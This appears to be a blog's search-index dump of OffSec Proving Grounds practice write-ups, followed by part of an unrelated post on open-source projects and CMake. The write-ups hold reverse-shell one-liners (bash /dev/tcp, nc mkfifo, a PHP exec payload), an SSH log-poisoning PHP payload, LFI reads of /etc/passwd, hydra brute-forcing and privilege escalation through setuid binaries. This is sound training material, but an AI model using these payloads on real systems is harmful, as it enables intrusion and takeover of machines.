OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.51.83Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Servi...", "content": "EnumerationMachine IP → 192.168.51.83Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 21 FTP vsftpd 3.0.3 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) 7080 HTTPS Litespeed httpd 8088 HTTP Litespeed httpd 8715 HTTP nginx 1.14.2 Therefore, a bunch of ports are open for http → 80, 7080, 8088, 8715, ftp on port 21 and ssh on port 22.Web ScanGoBuster scan → gobuster dir -u http://192.168.51.83 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtThe result for the port 7080 revealed nothing. The scan for port 80 resulted in the following finds → ebook/ (301) server-status (403)Directories/files listed for port 8088 → index.html cgi-bin/ (301) img/ (301) docs/ (301) upload.html upload.php css/ (301) protected/ (301) blocked/ (301) phpinfo.phpThe scan for the port 8715 revealed nothing.ExploitationLooking at the status codes 200 for the enumeration of port 8088, there are two files upload.html and upload.php. These are connected and are an upload capability. Uploading a file on the port 8088 website allows for the file to be accessed on a different web server. This web server is that running on port 8715. However, after testing txt and php files, php files are accessible while txt files need a password. Therefore, a php file can be used to create a reverse shell. Used the following php payload for the reverse shell →&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.49.187/3002 0&gt;&amp;1'\");?&gt;A good resource for a reverse shell is Pentest Monkey PHP reverse shell.Privilege EscalationThe reverse shell, therefore is the www-data user on the machine. This gives the user flag. Checked sudo capabilities for the user, but there were none. Search for setuid binaries did not give any results as well.The next checks are to be made for capabilities. Used getcap -r / 2&gt;/dev/null to list files with capabilities set. The result includes the entry → /usr/bin/python2.7 = cap_setuid+ep.Therefore, the following python code can be invoked using the said binary to elevate privileges → /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'. This gives the root flag." }, { "title": "OffSec PG - Inclusiveness", "url": "/blog/posts/oscp-pg-inclusiveness/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.80.14Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.14OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Servi...", "content": "EnumerationMachine IP → 192.168.80.14Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.14OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 21 FTP vsftpd 3.0.3 → Anonymous FTP allowed 22 SSH OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) Web ScanGoBuster scan → gobuster dir -u http://192.168.80.14 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html robots.txt seo.html javascript/ manual/Looking at the robots.txt, it says only search engines are allowed to access it. Therefore, changing the User-Agent to GoogleBot in burp allows bypassing this restriction. This gives the directory /secret_information/.ExploitationLFIThe /secret_information/ directory consists of an introduction to DNS Zone transfer attacks and links to display it in English or Spanish. The links are of the form ..?lang=language.php. Therefore, attempting LFI here allows to print contents of the /etc/passwd file. This gives enumeration of the users → tom and root.The anonymous ftp login shows that the pub directory of the FTP service is world writeable. Therefore, it is a good place for landing payloads. To get the exact path of the location, the configuration file must be read. From the service enumeration, the version is known to be vsftpd 3.0.3. The default config for this is at /etc/vsftpd.conf.Using LFI to print this shows the following →anon_root=/var/ftp/write_enable=YESReverse shell from Anonymous write-enabled FTP and LFIUsing the FTP to upload a reverse shell in PHP and then using LFI to navigate to the payload using the path found in the config file grants the shell as user www-data. The payload used is pentest monkey’s PHP reverse shell.Enumerating the setuid binaries, an interesting find was the presence of /home/tom/rootshell, which indicates getting privilege of user tom is the step required to get root on the machine.Privilege EscalationUserThe home directory of the user tom is readable by www-data. Therefore, visiting it grants access to the code of the rootshell binary found above. This also gives the user flag.The code of the rootshell binary uses FILE* f = popen(\"whoami\", \"r\");. This does not use an exact path, therefore, the PATH variable can be abused to trick the program into evaluating the username as tom. Therefore, creating a new directory in /tmp and an executable whoami under it that prints tom allows adding this to the current PATH.echo '#!/bin/bash' &gt; whoamiecho 'echo tom' &gt;&gt; whoamichmod +x whoamiexport PATH=/tmp/testdirectoryThis allows for execution of the rootshell binary, which evaluates all checks to true and grants the root shell, thereby the root flag." }, { "title": "OffSec PG - Ha Natraj", "url": "/blog/posts/oscp-pg-ha-natraj/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.51.80Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.80OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernelTable Port Ser...", "content": "EnumerationMachine IP → 192.168.51.80Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.80OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernelTable Port Service Other details (if any) 22 SSH OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.29 (Ubuntu) Web ScanGoBuster scan → gobuster dir -u http://192.168.51.80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpDirectories/files listed → images/ index.html console/The console/ directory has a php file present in it called file.php.ExploitationLFIRunning the file.php file does not give any output. As a good practice checking for LFI using ?file=../../../../../etc/passwd works out and LFI is possible. There is an ssh service on the machine, therefore, checked log files. The auth log file at /var/log/auth.log contains the ssh logs.Transition LFI to SSH Log PoisoningGiven the presence of SSH logs, poisoning is tested by using payload → ssh \"&lt;?php system(\\$_GET['cmd']);?&gt;\"@&lt;192.168.125.80&gt;. A failed login attempt gets logged and the php code is inserted. LFI can now be used to execute the php in the log file, with the addition of the cmd parameter like so → ..console/file.php?file=/var/log/auth.log&amp;cmd=id. This returned the id of the www-data user in the response i.e., RCE.User shellUsing the RCE, a shell can be spawned by using bash payload → bash -i &gt;&amp; /dev/tcp/192.168.49.208/3002 0&gt;&amp;1 to get a reverse shell. This can be done via burp to URL encode and send the payload. There was no bash in the system, therefore reverting to nc and /bin/sh combo → rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.208 3002 &gt;/tmp/f.This gives a www-data user shell via netcat.Privilege EscalationEscalated UserWith the www-data shell, the linenum script can be run (example → linenum script). This gives the files which are writable by the current user. One such file is the apache2.conf file which can be modified to ensure execution of the web server as a privileged user by editing the User and Group to be mahakal, a user detected by looking at the /etc/passwd file.Next, a pentest monkey php reverse shell is plugged into the serving directory for navigation to it. This can be named exploit.php. The server needs to be restarted for the new settings to be applied. Therefore, as revealed using sudo -l, the server can be restarted as super user without the need of a password using the systemctl command as the www-data user.After it is restarted, a listener can be used to receive shell as the user mahakal.RootAs the user mahakal, the binary that can be run as as a super user without a password as revealed by sudo -l is actually nmap.Nmap can be used to launch an interactive interpreter using →TF=$(mktemp)echo 'os.execute(\"/bin/sh\")' &gt; $TFnmap --script=$TFThus, the shell received is actually that of root. This gives the root flag." }, { "title": "OffSec PG - Geisha", "url": "/blog/posts/oscp-pg-geisha/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.56.82Network ScanNmap scan → nmap -sC -A -Pn -p- -o nmap.txt 192.168.56.82OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Servi...", "content": "EnumerationMachine IP → 192.168.56.82Network ScanNmap scan → nmap -sC -A -Pn -p- -o nmap.txt 192.168.56.82OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 21 FTP vsftpd 3.0.3 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) 7080 HTTPS ssl/empowerid LiteSpeed 7125 HTTP nginx 1.17.10 8088 HTTP LiteSpeed httpd 9198 HTTP SimpleHTTPServer 0.6 (Python 2.7.16) Web ScanGoBuster scan → gobuster dir -u http://192.168.56.82:&lt;ports&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpDirectories/files listed →Port 8088 → cgi-bin/ (404) docs/ blocked/ (403)Port 7125 → shadow (403) passwdThe passwd file lists user geisha.ExploitationWith the username as geisha, a brute force was launched on the ssh server using hydra as follows → hydra -l geisha -P /home/tanq/installations/SecLists/rockyou.txt ssh://192.168.56.82.This gives the password as letmein. After a successful login, the user flag can be obtained.Privilege EscalationUsing the user shell, enumerated for setuid binaries as follows → find / -perm -u=s 2&gt;/dev/null.This resulted in an interesting find for the binary /usr/bin/base32. This could be used to read files with a privileged access, thereby allowing reads of files owned by root. Therefore, it was used to read the root flag as follows →file=/root/proof.txt/usr/bin/base32 \"$file\" | /usr/bin/base32 --decodeThis can also be used to obtain root shell by using it to leak the ssh key of root and then using it to log in to the machine via ssh.This gave the root flag." }, { "title": "OffSec PG - Gaara", "url": "/blog/posts/oscp-pg-gaara/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.208.142Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Serv...", "content": "EnumerationMachine IP → 192.168.208.142Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) Web ScanGoBuster scan → gobuster dir -u http://192.168.208.142 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpThis did not reveal any useful information.ExploitationUsing the image on the webpage as a reference, the username could be gaara. Therefore, used hydra to brute force the ssh server against the rockyou password list.hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.208.142:22This gives the password as iloveyou2 and subsequently gets the user flag.Privilege EscalationChecking for setuid binaries reveals the presence of gdb as a setuid to root executable. The user is not present in the sudoers file. Therefore, it is essential to escalate using the gdb binary.This is done as follows → gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit.This grants the root shell and subsequently the root flag." }, { "title": "OffSec PG - FunBoxRookie", "url": "/blog/posts/oscp-pg-funboxrookie/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.80.107Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.107OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Ser...", "content": "EnumerationMachine IP → 192.168.80.107Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.107OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 21 FTP ProFTPD 1.3.5e 22 SSH OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.29 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.80.107 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html robots.txtRobots txt file contains entry of /logs/. However, this is not reachable.ExploitationThe ftp actually allows anonymous login despite the nmap service scan not listing it. Looking at the contents, there are a bunch of zip files with different user names. Cracking these files with fcrackzip against the rockyou.txt list of passwords, the following zip files were successfully cracked → cathrine.zip - catwoman homer.zip - catwoman tom.zip - iubireUnzipping all these with the respective passwords give an id_rsa file for ssh login. All the files are the same, therefore there is only 1 user. Therefore, trying all usernames, the one that works and grants a shell is the user tom.This gives the user flag. Navigation and other actions seem limited, therefore, checked shell and this revealed shell as /bin/rbash. This is a restricted shell. Used python to spawn a bash instance to escape this.Privilege EscalationLooking at the user directory, there is a mysql history file. The key entry here is that of → insert\\040into\\040support\\040(tom,\\040xx11yy22!);. This indicates additions of the user tom into the table support.Checking to see if this is the password for the user tom by using sudo -l, it indeed works out and shows that tom can perform all operations under sudo without a password. Therefore, using sudo su to get root shell, the root flag can be retrieved." }, { "title": "OffSec PG - FunBoxEnum", "url": "/blog/posts/oscp-pg-funboxenum/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.244.132Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.132OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.244.132Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.132OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.29 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.244.132 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html icons/ (403) javascript/ (403) mini.php robots.txt phpmyadmin/Robots txt file lists Enum_this_Box as allowed.ExploitationThe webpage mini.php is actually a shell interface with some limited options. This was used to read the local flag. This also had the functionality to upload files. This was used to upload the pentest monkey’s reverse shell code and get full shell.Privilege EscalationUserLooked at the /etc/passwd file, the users of importance are → root, goat, harry, karla, lissy, sally and oracle. The user oracle’s entry is → oracle:$1$|O@GOeN\\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash. Using John the Ripper to crack this gives the credentials oracle:hiphop. This did not work for ssh though.Running hydra to brute-force other users by using → hydra -l karla -P /home/tanq/installations/SecLists/rockyou.txt ssh://192.168.225.132. Ran linenum script for more enumeration, however, nothing useful was discovered. Tried user:user form of credentials for all users, which gave a success for goat:goat. This gives the user shell as user goat.RootLooking at sudo -l to enumerate privilege of the goat user, they are allowed to run /usr/bin/mysql as root without any password. MySQL has a functionality for spawning a shell. Executing sudo /usr/bin/mysql gives the mysql shell and using \\! bash in the mysql shell spawns a bash shell as the user root. This gives the root flag." }, { "title": "OffSec PG - FunBoxEasy", "url": "/blog/posts/oscp-pg-funboxeasy/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.101.111Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.101.111OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.101.111Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.101.111OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.41 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.101.111 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → robots.txt index.html index.php profile.php (302) header.php registration.php logout.php dashboard.php (302) leftbar.php forgot-password.php hitcounter.txt icons/ (403) store/ admin/ secret/ gym/Robots txt file contains the disallwed entry for gym, which was already found by gobuster.ExploitationLooking at the store directory, there is a book store with an admin login on the bottom of the page. This has the ability to add a new book which also has a file upload capability. This file is rendered as an image when visiting the book list via the publisher list. The publisher chosen for this was the Packt Publishing because it had 0 books.The image being rendered can be navigated to separately at the location /store/bootstrap/img/test.php. The contents of the php file were first &lt;?php echo \"Hello Test\"; ?&gt; to test if the code is actually executed. This did execute upon visiting the aforementioned location, therefore, the code was replaced with the pentest monkey reverse shell.This gives a reverse shell on the system when listening with netcat. This also gave the user flag.Privilege EscalationUserLooking at the /etc/passwd file, there are 2 users of interest → tony and root. Looking at the home directory of tony, it is readable by www-data. This directory had a password.txt file with the following contents →ssh: yxcvbnmYYYgym/admin: asdfghjklXXX/store: admin@admin.com adminThe ssh password allows access to the machine as user tony.RootLooked at the sudo capabilities of the user tony. The interesting entries were whois, finger, time and cancel. Out of these, only time was the tool which was already installed. time is a command that runs the command passed to it and records the time it took for the command to execute. Since sudo operation is allowed on it, it may escalate privileges while executing the shell.Therefore, sudo time /bin/bash gives the root shell and thus the root flag." }, { "title": "OffSec PG - Deception", "url": "/blog/posts/oscp-pg-deception/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.225.34Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.34OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.225.34Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.34OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.29 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.225.34 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html icons/ (403) wordpress/ javascript/ (403) phpmyadmin/Scanning the /wordpress/ directory again gives the following → index.php (301) wp-content/ wp-login.php license.txt wp-includes/ readme.html robots.txt robots.html wp-trackback.php wp-admin/ (302)Running WPScan on the target shows the following result → XMLRPC enabled at /wordpress/xmlrpc.php Directory listing at /wordpress/wp-content/uploads/ WP-Cron enabled at /wordpress/wp-cron.php Wordpress version 5.3.2 Enumerated users → yash and haclabsExploitationLooking at the page /wordpress/robots.html, it has a click interface which shows a playful alert. Looking at the code, a new webpage /wordpress/admindelete.html was discovered. This page says LOL,A Noob is looking for a hint. Based on this, searching for /wordpress/hint.html was discovered, which says Please collect all the API tokens availabe on the home page. Therefore, the homepage was scoured for API tokens. The following were found →API old0 : 5F4DCC3B5AAAPI old1 : 765D61D8API old2 : 327DEBAPI new : 882CF99When concatenated, this gives 5F4DCC3B5AA765D61D8327DEB882CF99. This is not any kind of hash, therefore, trying this out in credentials yash:5F4DCC3B5AA765D61D8327DEB882CF99 works. This gives the shell as user yash and the local flag.Privilege EscalationUserThe uuser yash is not allowed to run sudo, therefore, looked at the setuid binaries. The interesting ones were /usr/bin/arping and /usr/bin/traceroute6.iputils. Looking at the files in the home directory, there is a file .systemlogs which contains a bunch of text. This does have the username haclabs within \"\". Grepping out \" to accentuate them shows the following values →haclabsA=123456789+A[::-1]The following values make sense from the above → 987654321, 123456789987654321 and haclabs987654321. Trying these out for the user haclabs, the last one works and grants the shell.Roothaclabs can execute sudo for all commands without a password. Using this to spawn a shell grants the shell as root and thus, the root flag." }, { "title": "OffSec PG - Cyberspoloit1", "url": "/blog/posts/oscp-pg-cybersploit1/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.124.92Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.124.92OS Detection → os_info Port Service Other details (if any) ...", "content": "EnumerationMachine IP → 192.168.124.92Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.124.92OS Detection → os_info Port Service Other details (if any) 22 SSH OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.2.22 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.124.92 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpDirectories/files listed → index/ index.html robots/ hacker/The hacker/ page consists of a base64 string which decodes to cybersploit{youtube.com/c/cybersploit}.ExploitationThe source of the home page consists of &lt;!-------------username:itsskv---------------------&gt;. Therefore, this can be used for a password brute force on the ssh server. This did not reveal a password. Testing the previous base64 string as the password works and grants access to the user itsskv.This gives the first flag.Privilege EscalationEnumerating the setuid binaries gives no info. Looking at the kernel version and os version using uname -a, it seems the kernel is indeed an outdated one → 3.13.0. Using searchsploit to look at exploits for this version using searchsploit 3.13.0, there is an overlay.fs exploit for local privilege escalation.Compiling this binary for the 32 bit version and transferring to the machine via wget, enables getting root user shell after running it. This gives the root flag." }, { "title": "OffSec PG - Born2Root", "url": "/blog/posts/oscp-pg-born2root/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.225.49Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.49OS Detection → os_info Port Service Other details (if any) ...", "content": "EnumerationMachine IP → 192.168.225.49Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.49OS Detection → os_info Port Service Other details (if any) 22 SSH OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) 80 HTTP Apache httpd 2.4.10 ((Debian)) 111 RPCBIND rpcbind 2-4 (RPC #100000) 44532 - - Web ScanGoBuster scan → gobuster dir -u http://192.168.225.49 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtRobots txt file has two directories → wordpress-blog/ files/Directories/files listed → index.html robots.txt icons/ files/ manual/ExploitationThe /icons/ directory has a .txt file which seems out of place amongst all the other image files. Upon inspection, it contained an RSA private key. Used this to login to the ssh server running on the machine. For ther user, the most obvious one is martin given the clear mentions throughout the website. Upon loggin in, the shell asks for a secret password. Entering something random just drops into the shell and gives the user flag.The program that asked for the secret password was located at the end of the .bashrc in martin’s home directory. This was /var/tmp/login.py. Upon close inspection, the script has an error to always allow access into the shell. The script is as follows →#!/usr/bin/pythonimport osprint(\"\")print(\"READY TO ACCESS THE SECRET LAB ? \")print(\"\")password = raw_input(\"secret password : \")if (password) == \"secretsec\" or \"secretlab\" : ## --&gt; Always true\tprint(\"WELCOME ! \")else:\tprint(\"GET OUT ! \")\tos.system(\"pkill -u 'martin'\")Privilege EscalationLooking at the /etc/passwd file, the users of interest are root, martin, hadi and jimmy.User 1Looking at the crontab, there is a job by jimmy that runs every 5 minutes as python /tmp/sekurity.py. This file does not exist, therefore, can be created and subsequently executed. This can be used to receive a shell as jimmy over netcat. The home directory consists of a networker binary, which doesn’t seem to do anything concrete.User 2Cracking the password for hadi was taking too long, therefore a hack was used to grep out all passwords related to “hadi” from the rockyou.txt list. This sublist was also set on the cracking task in parallel, which found the password surprisingly quick, resulting in credentials hadi:hadi123.RootAs the hadi user, running su root directly gives the root shell and thus the root flag." }, { "title": "OffSec PG - BBS Cute", "url": "/blog/posts/oscp-pg-bbs-cute/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.192.128Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.192.128OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.192.128Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.192.128OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) 88 KERBEROS-SEC nginx 1.14.2 110 POP3 Courier pop3d 995 POP3S Courier pop3d Web ScanGoBuster scan → gobuster dir -u http://192.168.192.128 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.php index.html search.php rss.php icons/ (403) docs/ print.php uploads/ skins/ core/ manual/ popup.php captcha.php example.php libs/ snippet.php show_news.php cdata/ server-statusThe webserver is also running Cute News Management System powered by CuteNews 2.1.2.ExploitationUsing searchsploit to look at existing vulnerabilities, there are 4 results for the version of CuteNews being run on the system. looking at the RCE expoloit, the python code has easy to understand steps.Basically, the vulnerability is the ability to upload a reverse shell in place of the avatar for a given user and then navigating to it. The exploit requires various steps. The first is to register a user. This was done at the /index.php?register page. This required a captcha value, which did not load inline on the page. Without eefort, the captcha.php file found in directory busting gives the captcha code directly. Therefore, a user was registered.Next, the avatar for the user must be updated. This was done by navigating to /index.php?mod=main&amp;opt=personal page. The php reverse shell from pentest monkey is used as the file for upload here. However, this file is rejected. This implies that the server does check for file names or file headers. By hit and trial, the headers are being checked and not the extensions.Therefore, like the exploit-db version of the RCE, the php code must be prepended with the GIF8;\\n header to trick the server to think it is an image file. Also, the Content-Type header is not checked for file type. The reverse shell uploads successfully and navigating to it at /uploads/avatar_&lt;username&gt;_php_rev.php executes the php code and gives the reverse shell. The user flag is also obtained via the www-data permissions.Privilege EscalationEnumerating sudo -l and setuid files, the interesting option is that of hping3. Even if the sudo -l says only --icmp mode is allowed, since it is a setuid binary, the interface of hping3 can be sirectly exposed. The direct invocation of hping3 allows for a application shell to execute. This does support usual bash commands.whoami shows the permissions of root. Therefore, using the hping3 shell, the root flag can be obtained as well." }, { "title": "Introduction to Open Source Projects and CMake", "url": "/blog/posts/open-source-build/", "categories": "Computers and Fun", "tags": "open-source, cmake, make", "date": "2021-06-15 03:00:00 -0400", "snippet": "Open Source ProjectsAnatomy of Open Source ProjectsA typical open source project has the following types of people → Author - The one who creates the project Owner - The one who has administrativ...", "content": "Open Source ProjectsAnatomy of Open Source ProjectsA typical open source project has the following types of people → Author - The one who creates the project Owner - The one who has administrative ownership over the organization or the repository Maintainers - Contributors responsible for managing the organizational aspects of the project (may also be authors or owners) Contributors - The ones who have contributed something to the project Community Members - The ones who use the project and may be active in conversations and expression of opinionsBigger projects can also have teams working on a particular task such as tooling, community moderation, etc. Documentation for the project has the following structure → License - The Open Source Initiative (OSI) has an approved list of tens of licenses, the most common of which are → GNU’s General Public License (GNU GPL) - Most popular. Created by Richard Stallman. It is copyleft (Any software written based on any GPL component must be released as open source regardless of the percentage in the entire code). Apache Software Foundation (ASF)’s Apache license - This license allows one to freely use, modify and distribute any Apache licensed product (required to follow the terms of the license). MIT License - This allows one to do anything with the software under this license, provided that a copy of the license is included in the work. Other licenses such as BSD licenses, EPL, etc. also exist. All licenses are divided into permissive or copyleft. MIT, Apache 2.0 and BSD licenses are most popular permissive licenses, while GNU GPLv3 is the most popular copyleft license. Permissive licenses allow developers to include their own copyright statements while copyleft licenses do not (no copyright claims or patents on the original software). README - The instruction manual to welcome community members (those who use the project). Contributing - Explains what type of contributions are needed and how the process works. Code Of Conduct - Sets ground rules for participants’ behavior.The following are used for an organized discussion → Issue Tracker Pull Requests Discussion Forums Synchronous chat channelsContribution Process FlowTo make a contribution to a repository, first fork the repository to a personal repository. Then follow the steps of fork → clone → push → PR. These steps basically mean → Fork the repository of interest to create a copy on github personal account. Clone the repository (personal copy) to the local machine. Change files, add features or any modifications. Add the changes and commit them using git. Push the changes to the required branch in the remote repository (personal). (Optional) Merge the branch to personal master using git merge. “Compare and Pull” or “Pull request” button on the repository link is used to create a pull request.FactsThe base repository from which a fork is made is also called the upstream repository. For git config, omit the --global argument to make config changes to only the current git repository.C/C++ ProjectsProject StructureA basic structure for a C/C++ project would be as follows →Project_name||---- CMakeLists.txt||---- include| || |---- Project_name| || |---- public_header(s).h|---- src| || |---- private_header(s).h| || |---- code(s).cpp||---- libs| || |---- A| || |---- B||---- testsThis could be an example of a library which can be used directly or by a third party. The idea behind the structure is to keep private headers separate from public headers (for functions which anyone using the library can invoke).Structure Explanation include/ → By convention, this directory is for header files but according to modern practices, it must strictly contain headers that need to be publicly exposed. The directory with the same name as that of the project inside the include directory is used so that it supports generalisation when one imports the public header as → #include &lt;Project_Name/public_header.h&gt; Instead of #include &lt;public_header.h&gt; src/ → This directory contains the source code and header files which are for internal use only. All code that the project consists of goes in here. libs/ → This directory contains the third party libraries needed by the project. Usually, these follow the same structure as the one used for this project. Libraries in C++ can be used in one of two ways - static and dynamic. Only static libraries are present in the libs directory. test/ → Directory to store unit tests and other kinds of tests, if any. CMakeList.txt → A configuration file to define the function of CMake, which is a build system 